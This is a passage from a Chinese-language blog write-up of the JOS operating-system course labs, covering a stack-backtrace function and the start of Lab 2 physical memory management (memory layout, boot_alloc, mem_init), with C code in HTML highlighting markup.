函数的代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">mon_backtrace</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="keyword">struct</span> Trapframe *tf)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// Your code here.</span></span><br><span class="line">    <span class="type">uint32_t</span> *old_ebp, last_eip;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Eipdebuginfo</span> <span class="title">eipdebuginfo</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(<span class="string">&quot;movl %%ebp, %0;&quot;</span> : <span class="string">&quot;=r&quot;</span> (old_ebp))</span>;</span><br><span class="line">    cprintf(<span class="string">&quot;Stack backtrace:\n&quot;</span>);</span><br><span class="line">    <span class="keyword">while</span> (old_ebp)</span><br><span class="line">    &#123;</span><br><span class="line">        last_eip = old_ebp[<span class="number">1</span>];</span><br><span class="line">        debuginfo_eip(last_eip, &amp;eipdebuginfo);</span><br><span class="line">        cprintf(<span class="string">&quot;  ebp %08x  eip %08x  args %08x %08x %08x %08x %08x\n&quot;</span>, </span><br><span class="line">            old_ebp, last_eip, old_ebp[<span class="number">2</span>], old_ebp[<span class="number">3</span>], old_ebp[<span class="number">4</span>], old_ebp[<span class="number">5</span>], old_ebp[<span class="number">6</span>]);</span><br><span class="line">        cprintf(<span class="string">&quot;         %s:%d: &quot;</span>, </span><br><span class="line">            eipdebuginfo.eip_file, eipdebuginfo.eip_line);</span><br><span class="line">        cprintf(<span class="string">&quot;%.*s+%d\n&quot;</span>,</span><br><span class="line">            eipdebuginfo.eip_fn_namelen, eipdebuginfo.eip_fn_name, last_eip - eipdebuginfo.eip_fn_addr);</span><br><span class="line">        old_ebp = (<span class="type">uint32_t</span> *) old_ebp[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最终运行效果如下：</p><p><img src="https://s2.loli.net/2022/02/21/3JksWlBiI7VNYEG.png" alt="imagepng"></p><p>运行 <code>make grade</code> 以检查 lab 1 的完成情况，可以看到我们成功完成了 lab 1 的代码部分，至此， lab 1 结束</p><p><img src="https://s2.loli.net/2022/02/21/GM57bwBngJP6UdO.png" alt="imagepng"></p><h1 id="0x02-Lab-2-Memory-Management"><a href="#0x02-Lab-2-Memory-Management" class="headerlink" title="0x02.Lab 2: Memory Management"></a>0x02.Lab 2: Memory Management</h1><p>在这一部分当中我们需要实现 OS kernel 的<strong>内存管理模块</strong>，分为两部分：</p><ul><li><p>物理内存分配器：我们需要将所有的物理内存以「页」为单位进行管理，并记录下各个页的状态（空闲或已被分配）、共享该页面的进程数量等，并实现分配与释放物理页的函数</p></li><li><p>虚拟内存分配器：我们需要完成对页表的管理，主要是实现虚拟地址到物理地址的映射的建立功能</p></li></ul><p>首先用 git 拉 lab2 的代码下来，这里笔者前面 lab 1 的代码没有 handin 所以前面提示了一下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git checkout -b lab2 origin/lab2</span></span><br><span class="line">M    kern/kdebug.c</span><br><span class="line">M    kern/monitor.c</span><br><span class="line">M    lib/printfmt.c</span><br><span class="line">Branch &#x27;lab2&#x27; set up to track remote branch &#x27;lab2&#x27; from &#x27;origin&#x27;.</span><br><span class="line">Switched to a new branch &#x27;lab2&#x27;</span><br></pre></td></tr></table></figure><p>lab 2 新增了这些文件：</p><ul><li>inc&#x2F;memlayout.h</li><li>kern&#x2F;pmap.c</li><li>kern&#x2F;pmap.h</li><li>kern&#x2F;kclock.h</li><li>kern&#x2F;kclock.c</li></ul><p><code>memlayout.h</code> 中描述了虚拟地址空间的布局，我们需要通过修改 <code>pmap.c</code> 来实现；在 <code>memlayout.h</code> 与 <code>pmap.h</code> 中定义了 <code>Pageinfo</code> 结构体，用以描述单个物理页，与 Linux 内核的做法类似，一个 Pageinfo 对应一张物理页，所以在该结构体中只需要存储该页的状态即可；<code>kclock.c</code> 与 <code>kclock.h</code> 用以操作电池后备时钟与 CMOS RAM 硬件，其在 BIOS 中记录了 PC 的物理内存容量与其他东西，在 <code>pmap.c</code> 中的代码需要读取该设备以计算可用物理内存，这部分代码 xv6 已经帮我们实现好了所以我们暂时不需要了解 CMOS 的原理</p><blockquote><p> 在笔者的 <a href="https://arttnba3.cn/2021/06/24/CODE-0X00-A3OS/">【CODE.0x00】从零开始的32位操作系统开发手记 - arttnba3’s blog</a> 中记录了三种获取可用物理内存容量与布局的方式，原型来自 Linux 内核</p></blockquote><p>在 <code>memlayout.h</code> 中对将要建立的内存布局描述如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line"> * Virtual memory map:                                Permissions</span><br><span class="line"> *                                                    kernel/user</span><br><span class="line"> *</span><br><span class="line"> *    4 Gig --------&gt;  +------------------------------+</span><br><span class="line"> *                     |                              | RW/--</span><br><span class="line"> *                     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span><br><span class="line"> *                     :              .               :</span><br><span class="line"> *                     :              .               :</span><br><span class="line"> *                     :              .               :</span><br><span class="line"> *                     |~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~| RW/--</span><br><span class="line"> *                     |                              | RW/--</span><br><span class="line"> *                     |   Remapped Physical Memory   | RW/--</span><br><span class="line"> *                     |                              | RW/--</span><br><span class="line"> *    KERNBASE, ----&gt;  +------------------------------+ 0xf0000000      --+</span><br><span class="line"> *    KSTACKTOP        |     CPU0&#x27;s Kernel Stack      | RW/--  KSTKSIZE   |</span><br><span class="line"> *                     | - - - - - - - - - - - - - - -|                   |</span><br><span class="line"> *                     |      Invalid Memory (*)      | --/--  KSTKGAP    |</span><br><span class="line"> *                     +------------------------------+                   |</span><br><span class="line"> *                     |     CPU1&#x27;s Kernel Stack      | RW/--  KSTKSIZE   |</span><br><span class="line"> *                     | - - - - - - - - - - - - - - -|                 PTSIZE</span><br><span class="line"> *                     |      Invalid Memory (*)      | --/--  KSTKGAP    |</span><br><span class="line"> *                     +------------------------------+                   |</span><br><span class="line"> *                     :              .               :                   |</span><br><span class="line"> *                     :              .               :                   |</span><br><span class="line"> *    MMIOLIM ------&gt;  +------------------------------+ 0xefc00000      --+</span><br><span class="line"> *                     |       Memory-mapped I/O      | RW/--  PTSIZE</span><br><span class="line"> * ULIM, MMIOBASE --&gt;  +------------------------------+ 0xef800000</span><br><span class="line"> *                     |  Cur. Page Table (User R-)   | R-/R-  PTSIZE</span><br><span class="line"> *    UVPT      ----&gt;  +------------------------------+ 0xef400000</span><br><span class="line"> *                     |          RO PAGES            | R-/R-  PTSIZE</span><br><span class="line"> *    UPAGES    ----&gt;  +------------------------------+ 0xef000000</span><br><span class="line"> *                     |           RO ENVS            | R-/R-  PTSIZE</span><br><span class="line"> * UTOP,UENVS ------&gt;  +------------------------------+ 0xeec00000</span><br><span class="line"> * UXSTACKTOP -/       |     User Exception Stack     | RW/RW  PGSIZE</span><br><span class="line"> *                     +------------------------------+ 0xeebff000</span><br><span class="line"> *                     |       Empty Memory (*)       | --/--  PGSIZE</span><br><span class="line"> *    USTACKTOP  ---&gt;  +------------------------------+ 0xeebfe000</span><br><span class="line"> *                     |      Normal User Stack       | RW/RW  PGSIZE</span><br><span class="line"> *                     +------------------------------+ 0xeebfd000</span><br><span class="line"> *                     |                              |</span><br><span class="line"> *                     |                              |</span><br><span class="line"> *                     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span><br><span class="line"> *                     .                              .</span><br><span class="line"> *                     .                              .</span><br><span class="line"> *                     .                              .</span><br><span class="line"> *                     |~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~|</span><br><span class="line"> *                     |     Program Data &amp; Heap      |</span><br><span class="line"> *    UTEXT --------&gt;  +------------------------------+ 0x00800000</span><br><span class="line"> *    PFTEMP -------&gt;  |       Empty Memory (*)       |        PTSIZE</span><br><span class="line"> *                     |                              |</span><br><span class="line"> *    UTEMP --------&gt;  +------------------------------+ 0x00400000      --+</span><br><span class="line"> *                     |       Empty Memory (*)       |                   |</span><br><span class="line"> *                     | - - - - - - - - - - - - - - -|                   |</span><br><span class="line"> *                     |  User STAB Data (optional)   |                 PTSIZE</span><br><span class="line"> *    USTABDATA ----&gt;  +------------------------------+ 0x00200000        |</span><br><span class="line"> *                     |       Empty Memory (*)       |                   |</span><br><span class="line"> *    0 ------------&gt;  +------------------------------+                 --+</span><br><span class="line"> *</span><br><span class="line"> * (*) Note: The kernel ensures that &quot;Invalid Memory&quot; is *never* mapped.</span><br><span class="line"> *     &quot;Empty Memory&quot; is normally unmapped, but user programs may map pages</span><br><span class="line"> *     there if desired.  JOS user programs map pages temporarily at UTEMP.</span><br><span class="line"> */</span><br></pre></td></tr></table></figure><h2 id="Part-1-Physical-Page-Management"><a href="#Part-1-Physical-Page-Management" class="headerlink" title="Part 1: Physical Page Management"></a>Part 1: Physical Page Management</h2><p>操作系统应当要管理好内存中的每一张内存页，JOS 同样以页为粒度进行管理，在本部分中我们需要为 JOS 编写一个物理内存页分配器，其使用一个链表来将空闲的物理页对应的 Pageinfo 结构体相连</p><p>在 Exercise 1 中要求我们实现该物理内存页分配器的几个函数</p><blockquote><p>Exercise 1. In the file kern&#x2F;pmap.c, you must implement code for the following functions (probably in the order given).</p><p><code>boot_alloc()</code><br><code>mem_init()</code> (only up to the call to <code>check_page_free_list(1)</code>)<br><code>page_init()</code><br><code>page_alloc()</code><br><code>page_free()</code></p><p><code>check_page_free_list()</code> and <code>check_page_alloc()</code> test your physical page allocator. You should boot JOS and see whether <code>check_page_alloc()</code> reports success. Fix your code so that it passes. You may find it helpful to add your own <code>assert()</code>s to verify that your assumptions are correct.</p></blockquote><p>笔者本人很想直接写一个 buddy system（笑），但一是技术力好像不大够的样子，二是在对 JOS 没有足够了解的情况下还是先按照给的注释来实现</p><p>我们先来看 <code>kern/pmap.c</code> ，在一开头声明了这几个全局变量：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// These variables are set by i386_detect_memory()</span></span><br><span class="line"><span class="type">size_t</span> npages;<span class="comment">// Amount of physical memory (in pages)</span></span><br><span class="line"><span class="type">static</span> <span class="type">size_t</span> npages_basemem;<span class="comment">// Amount of base memory (in pages)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// These variables are set in mem_init()</span></span><br><span class="line"><span class="type">pde_t</span> *kern_pgdir;<span class="comment">// Kernel&#x27;s initial page directory</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PageInfo</span> *<span class="title">pages</span>;</span><span class="comment">// Physical page state array</span></span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">PageInfo</span> *<span class="title">page_free_list</span>;</span><span class="comment">// Free list of physical pages</span></span><br></pre></td></tr></table></figure><ul><li><code>npages</code>：以页为单位的物理内存总量</li><li><code>npages_basemem</code>：以页为单位的可用内存总量</li><li><code>kern_pgdir</code>：内核的页全局目录表</li><li><code>pages</code>：页结构体（PageInfo）数组的指针</li><li><code>page_free_list</code>：空闲的物理页单向链表头节点</li></ul><p>那么我们这里可以看出来这个内存管理有点类似于 FLATMEM 内存模型：直接由一个大的 page 结构体数组对应一块可用物理内存区域。再加上 “只有一个单向链表的 buddy system”，大概就如下图所示（笔者拿两张讲 Linux的图拆开拼成的）</p><p><img src="https://s2.loli.net/2022/03/15/umCBxeDPFc7I23h.png" alt="JOS的内存管理"></p><p>这里我们需要注意一点：<strong>PageInfo 结构体并不需要存储地址信息，因为他是一个结构体数组直接对应整个物理内存空间</strong>，相应地就有 pages[0] 对应地址 0，pages[1] 对应地址 0x1000…<strong>我们其实很容易能得到 PageInfo 地址到物理页帧之间的转换公式</strong>，这里我们直接看在 <code>kern/pmap.h</code> 中实现的两个转换函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">physaddr_t</span></span><br><span class="line"><span class="title function_">page2pa</span><span class="params">(<span class="keyword">struct</span> PageInfo *pp)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> (pp - pages) &lt;&lt; PGSHIFT;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="keyword">struct</span> PageInfo*</span><br><span class="line"><span class="title function_">pa2page</span><span class="params">(<span class="type">physaddr_t</span> pa)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (PGNUM(pa) &gt;= npages)</span><br><span class="line">panic(<span class="string">&quot;pa2page called with invalid pa&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> &amp;pages[PGNUM(pa)];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当然，我们现在所说的都是虚拟地址，我们仍需要一个虚拟地址与物理地址之间直接转换的函数，参照上图，由于是线性映射，故直接减去一个差值即可，在<code>kern/pmap.h</code> 中便实现了虚拟地址到物理地址转换的函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* This macro takes a kernel virtual address -- an address that points above</span></span><br><span class="line"><span class="comment"> * KERNBASE, where the machine&#x27;s maximum 256MB of physical memory is mapped --</span></span><br><span class="line"><span class="comment"> * and returns the corresponding physical address.  It panics if you pass it a</span></span><br><span class="line"><span class="comment"> * non-kernel virtual address.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PADDR(kva) _paddr(__FILE__, __LINE__, kva)</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">physaddr_t</span></span><br><span class="line">_paddr(<span class="type">const</span> <span class="type">char</span> *file, <span class="type">int</span> line, <span class="type">void</span> *kva)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> ((<span class="type">uint32_t</span>)kva &lt; KERNBASE)</span><br><span class="line">_panic(file, line, <span class="string">&quot;PADDR called with invalid kva %08lx&quot;</span>, kva);</span><br><span class="line"><span class="keyword">return</span> (<span class="type">physaddr_t</span>)kva - KERNBASE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现在我们可以开始补完 Exercise 1 的几个函数的代码了</p><h4 id="boot-alloc-：物理内存线性分配器"><a href="#boot-alloc-：物理内存线性分配器" class="headerlink" title="boot_alloc()：物理内存线性分配器"></a>boot_alloc()：物理内存线性分配器</h4><p>按惯例，先看注释：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// This simple physical memory allocator is used only while JOS is setting</span></span><br><span class="line"><span class="comment">// up its virtual memory system.  page_alloc() is the real allocator.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// If n&gt;0, allocates enough pages of contiguous physical memory to hold &#x27;n&#x27;</span></span><br><span class="line"><span class="comment">// bytes.  Doesn&#x27;t initialize the memory.  Returns a kernel virtual address.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// If n==0, returns the address of the next free page without allocating</span></span><br><span class="line"><span class="comment">// anything.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// If we&#x27;re out of memory, boot_alloc should panic.</span></span><br><span class="line"><span class="comment">// This function may ONLY be used during initialization,</span></span><br><span class="line"><span class="comment">// before the page_free_list list has been set up.</span></span><br></pre></td></tr></table></figure><ul><li><p>该函数为一个简易的 physical memory allocator，<strong>只在 JOS 建立其虚拟内存系统时使用</strong>，算是内核初始化过程中的一个临时函数</p></li><li><p>其功能主要是返回以页为单位的连续的物理内存空间的虚拟地址的起始地址，n为0时返回下一个空闲页面，OOM时 panic</p></li></ul><p>掌握了这些信息就可以开始写了，函数一开头定义了一个 static 的变量 <code>nextfree</code>，表示其分配方式是从内存一开始线性往后切割的，由于这是一个虚拟地址所以我们在计算是否 OOM 时还需要转化成物理地址，因为预设页表只映射了 4MB 内存故这里超出 4MB 我们直接 OOM panic；对页大小的对齐直接使用 <code>ROUNDUP</code> 即可</p><blockquote><p>ROUNDUP 是 GCC 的宏还是 JOS 的宏呢？暂且不考证（其实是没找到），这里直接“拿来主义”</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> *</span><br><span class="line"><span class="title function_">boot_alloc</span><span class="params">(<span class="type">uint32_t</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">static</span> <span class="type">char</span> *nextfree;<span class="comment">// virtual address of next byte of free memory</span></span><br><span class="line"><span class="type">char</span> *result;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Initialize nextfree if this is the first time.</span></span><br><span class="line"><span class="comment">// &#x27;end&#x27; is a magic symbol automatically generated by the linker,</span></span><br><span class="line"><span class="comment">// which points to the end of the kernel&#x27;s bss segment:</span></span><br><span class="line"><span class="comment">// the first virtual address that the linker did *not* assign</span></span><br><span class="line"><span class="comment">// to any kernel code or global variables.</span></span><br><span class="line"><span class="keyword">if</span> (!nextfree) &#123;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">char</span> end[];</span><br><span class="line">nextfree = ROUNDUP((<span class="type">char</span> *) end, PGSIZE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Allocate a chunk large enough to hold &#x27;n&#x27; bytes, then update</span></span><br><span class="line"><span class="comment">// nextfree.  Make sure nextfree is kept aligned</span></span><br><span class="line"><span class="comment">// to a multiple of PGSIZE.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// LAB 2: Your code here.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// n == 0, return nextfree directly</span></span><br><span class="line"><span class="keyword">if</span> (!n)</span><br><span class="line"><span class="keyword">return</span> nextfree;</span><br><span class="line"></span><br><span class="line"><span class="comment">// fix up n to PGSIZE</span></span><br><span class="line">n = ROUNDUP(n, PGSIZE);</span><br><span class="line"></span><br><span class="line"><span class="comment">// check if OOM, panic</span></span><br><span class="line"><span class="keyword">if</span> (PADDR(nextfree + n) &gt; <span class="number">0x00400000</span>)</span><br><span class="line">panic(<span class="string">&quot;Out of Memory!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// normally return memory</span></span><br><span class="line">result = nextfree;</span><br><span class="line">nextfree += n;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="mem-init-：初始化二级页表，建立-freelist（part1）"><a href="#mem-init-：初始化二级页表，建立-freelist（part1）" class="headerlink" title="mem_init()：初始化二级页表，建立 freelist（part1）"></a>mem_init()：初始化二级页表，建立 freelist（part1）</h4><p>按顺序接下来到 <code>mem_init()</code> 函数，惯例先看注释，主要是初始化内核地址空间：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Set up a two-level page table:</span></span><br><span class="line"><span class="comment">//    kern_pgdir is its linear (virtual) address of the root</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// This function only sets up the kernel part of the address space</span></span><br><span class="line"><span class="comment">// (ie. addresses &gt;= UTOP).  The user part of the address space</span></span><br><span class="line"><span class="comment">// will be set up later.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// From UTOP to ULIM, the user is allowed to read but not write.</span></span><br><span class="line"><span class="comment">// Above ULIM the user cannot read or write.</span></span><br></pre></td></tr></table></figure><p>首先是通过 <code>i386_detect_memory()</code> 检测可用内存容量，之后用 <code>boot_alloc()</code> 分配一张页面做二级页表的 PGD，并<strong>建立自我映射，设置对应权限</strong>，以此我们便能通过虚拟地址访问页表了</p><blockquote><p>参见  <code>memlayout.h</code> 中的内存布局，<code>UVPT</code> 指向 PGD 起始地址，<code>PDX()</code> 则是将虚拟地址转换到页目录表项下标的宏，<code>PTE_U</code> 表示 ring0~ring3都能访问，<code>PTE_P</code> 表示该页面存在</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">mem_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">uint32_t</span> cr0;</span><br><span class="line"><span class="type">size_t</span> n;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Find out how much memory the machine has (npages &amp; npages_basemem).</span></span><br><span class="line">i386_detect_memory();</span><br><span class="line"></span><br><span class="line"><span class="comment">// Remove this line when you&#x27;re ready to test this function.</span></span><br><span class="line"><span class="comment">//panic(&quot;mem_init: This function is not finished\n&quot;);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//////////////////////////////////////////////////////////////////////</span></span><br><span class="line"><span class="comment">// create initial page directory.</span></span><br><span class="line">kern_pgdir = (<span class="type">pde_t</span> *) boot_alloc(PGSIZE);</span><br><span class="line"><span class="built_in">memset</span>(kern_pgdir, <span class="number">0</span>, PGSIZE);</span><br><span class="line"></span><br><span class="line"><span class="comment">//////////////////////////////////////////////////////////////////////</span></span><br><span class="line"><span class="comment">// Recursively insert PD in itself as a page table, to form</span></span><br><span class="line"><span class="comment">// a virtual page table at virtual address UVPT.</span></span><br><span class="line"><span class="comment">// (For now, you don&#x27;t have understand the greater purpose of the</span></span><br><span class="line"><span class="comment">// following line.)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Permissions: kernel R, user R</span></span><br><span class="line">kern_pgdir[PDX(UVPT)] = PADDR(kern_pgdir) | PTE_U | PTE_P;</span><br></pre></td></tr></table></figure><p>接下来到由我们补全的部分：分配 pages 数组并初始化为 0，十几秒就能写完：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//////////////////////////////////////////////////////////////////////</span></span><br><span class="line"><span class="comment">// Allocate an array of npages &#x27;struct PageInfo&#x27;s and store it in &#x27;pages&#x27;.</span></span><br><span class="line"><span class="comment">// The kernel uses this array to keep track of physical pages: for</span></span><br><span class="line"><span class="comment">// each physical page, there is a corresponding struct PageInfo in this</span></span><br><span class="line"><span class="comment">// array.  &#x27;npages&#x27; is the number of physical pages in memory.  Use memset</span></span><br><span class="line"><span class="comment">// to initialize all fields of each struct PageInfo to 0.</span></span><br><span class="line"><span class="comment">// Your code goes here:</span></span><br><span class="line">pages = (<span class="keyword">struct</span> PageInfo*) boot_alloc(npages * <span class="keyword">sizeof</span>(<span class="keyword">struct</span> PageInfo));</span><br><span class="line"><span class="built_in">memset</span>(pages, <span class="number">0</span>, npages * <span class="keyword">sizeof</span>(<span class="keyword">struct</span> PageInfo));</span><br></pre></td></tr></table></figure><p>继续阅读，接下来会调用 <code>page_init()</code> 初始化 pages 数组中的每一个 PageInfo ，主要是设置引用计数为 0 并链到 freelist 上，之后是三个检查函数，Exercise 1 中提到我们这一步只需要补全到 <code>check_page_free_list()</code>，所以接下来开始补全 <code>page_init()</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//////////////////////////////////////////////////////////////////////</span></span><br><span class="line"><span class="comment">// Now that we&#x27;ve allocated the initial kernel data structures, we set</span></span><br><span class="line"><span class="comment">// up the list of free physical pages. Once we&#x27;ve done so, all further</span></span><br><span class="line"><span class="comment">// memory management will go through the page_* functions. In</span></span><br><span class="line"><span class="comment">// particular, we can now map memory using boot_map_region</span></span><br><span class="line"><span class="comment">// or page_insert</span></span><br><span class="line">page_init();</span><br><span class="line"></span><br><span class="line">check_page_free_list(<span class="number">1</span>);</span><br><span class="line">check_page_alloc();</span><br><span class="line">check_page();</span><br></pre></td></tr></table></figure><h4 id="page-init-：初始化-pages-数组与-freelist"><a href="#page-init-：初始化-pages-数组与-freelist" class="headerlink" title="page_init()：初始化 pages 数组与 freelist"></a>page_init()：初始化 pages 数组与 freelist</h4><p>惯例先看注释：初始化 pages 结构体与 freelist</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// 